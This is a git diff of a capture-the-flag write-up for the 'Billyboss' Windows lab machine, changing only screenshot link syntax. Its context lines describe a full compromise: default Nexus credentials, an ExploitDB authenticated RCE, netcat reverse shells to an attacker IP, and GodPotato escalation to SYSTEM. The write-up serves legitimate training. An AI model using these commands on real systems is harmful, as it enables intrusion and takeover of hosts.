@@ -77,16 +77,16 @@ Since we don't have credentials and anonymous login isn't enabled on ftp we can 
 
 Only has a web page; `BaGet` open-source server that has Microsoft IIS running based on our nmap scan so nothing useful to us there. At least for now.
 
-![[Screenshot_2026-01-21_11-31-54.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_11-31-54.png)
 
 ### Port 8081
 
 We see the homepage for the Sonatype Nexus Repository Manager Application. This is essentially a private, secure storage and distribution center for software components (libraries, containers, etc). We also see the version of the application (OSS 3.21.0-05). The sign in tab gives us a pop up window to enter credentials. 
 
-![[Screenshot_2026-01-21_11-51-25.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_11-45-48.png)
 
 
-![[Screenshot_2026-01-21_11-45-48.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_11-51-25.png)
 
 We can use run gobuster to enumerate directories and see if anything interesting comes up.
 
@@ -96,11 +96,11 @@ We can use run gobuster to enumerate directories and see if anything interesting
 
 While that is running we will search for default credentials to access the application. Doing some research we discover the credentials `admin:admin123`.
 
-![[Screenshot_2026-01-21_12-15-37.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-15-37.png)
 
 Unfortunately that didn't work.
 
-![[Screenshot_2026-01-21_12-16-59.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-16-59.png)
 
 We can also use the seclists password wordlists to look for credentials. This keeps a curated list of default credentials for multiple applications and platforms. We will use grep to only results credentials pertaining to Sonatype Nexus.
 
@@ -112,17 +112,17 @@ Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,==ne
 
 We see the previous one we tried as well as a new set of credentials `nexus:nexus`. 
 
-![[Screenshot_2026-01-21_12-24-52.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-24-52.png)
 
 It works.
 
 However looking at the browse tab all the repositories are empty.
 
-![[Screenshot_2026-01-21_12-27-24.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-27-24.png)
 
 So far we have default credentials and the version of the application. We can use this information to search for an exploit. [ExploitDB](https://www.exploit-db.com/exploits/49385) provides an Authenticated RCE vulnerability we can exploit.
 
-![[Screenshot_2026-01-21_12-30-19.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-30-19.png)
 
 Rather than downloading the exploit from the website, using searchsploit lets me download it directly to my current working directory.
 
@@ -152,7 +152,7 @@ Copied to: /home/pyro/Documents/ProvingGrounds/WindowsBoxes/Billyboss/49385.py
 
 Opening the script, we will modify the target url, the command we want the script to execute and feed it the credentials we obtained.
 
-![[Screenshot_2026-01-21_12-51-56.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_12-51-56.png)
 
 We will use this powershell command to transfer the windows executable of netcat in order to get a reverse shell.
 
@@ -168,11 +168,11 @@ python3 -m http.server 80
 
 We have modified the script
 
-![[Screenshot_2026-01-21_13-04-32.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-04-32.png)
 
 And when we run the script the command was successfully executed and from the http server we can see we were able to transfer `nc.exe`
 
-![[Screenshot_2026-01-21_13-06-28.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-06-28.png)
 
 We will setup our netcat listener at port 4444.
 
@@ -186,15 +186,15 @@ Then modify the command to have the netcat executable connect with our listener 
 .\\\\nc.exe 192.168.45.213 4444 -e cmd.exe
 ```
 
-![[Screenshot_2026-01-21_13-14-39.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-14-39.png)
 
 Run the script again and we should get a reverse shell
 
-![[Screenshot_2026-01-21_13-17-47.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-17-47.png)
 
 The first flag is in the Desktop directory.
 
-![[Screenshot_2026-01-21_13-19-53.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-19-53.png)
 
 
 # Privilege Escalation
@@ -251,7 +251,7 @@ Now I can use the following powershell command to download the GodPotato exploit
 
 Don't forget to start the python http server to host the file.
 
-![[Screenshot_2026-01-21_13-38-52.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-38-52.png)
 
 We will use the `whoami` command to test if the exploit works.
 
@@ -259,7 +259,7 @@ We will use the `whoami` command to test if the exploit works.
 .\GodPotato-NET4.exe -cmd "whoami"
 ```
 
-![[Screenshot_2026-01-21_13-41-04.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-41-04.png)
 
 We see that the user has changed after running GodPotato to NT AUTHORITY\SYSTEM which is the highest privileged user on a Windows system, so we know it works. 
 
@@ -277,11 +277,11 @@ Then I will run the following command on the target system to run the netcat exe
 PS C:\Users\nathan\Desktop> .\GodPotato-NET4.exe -cmd "C:\Users\nathan\Nexus\nexus-3.21.0-05\nc.exe -e cmd 192.168.45.213 6666" 
 ```
 
-![[Screenshot_2026-01-21_13-50-32.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-50-32.png)
 
 For some reason, the `whoami` command doesn't work but you can access the Administrator's account and see the second flag; proof that we are logged in as NT AUTHORITY\SYSTEM.
 
-![[Screenshot_2026-01-21_13-56-57.png]]
+![Alt text](./screenshots/Screenshot_2026-01-21_13-56-57.png)
 
 Fully ROOTED!!!!
 
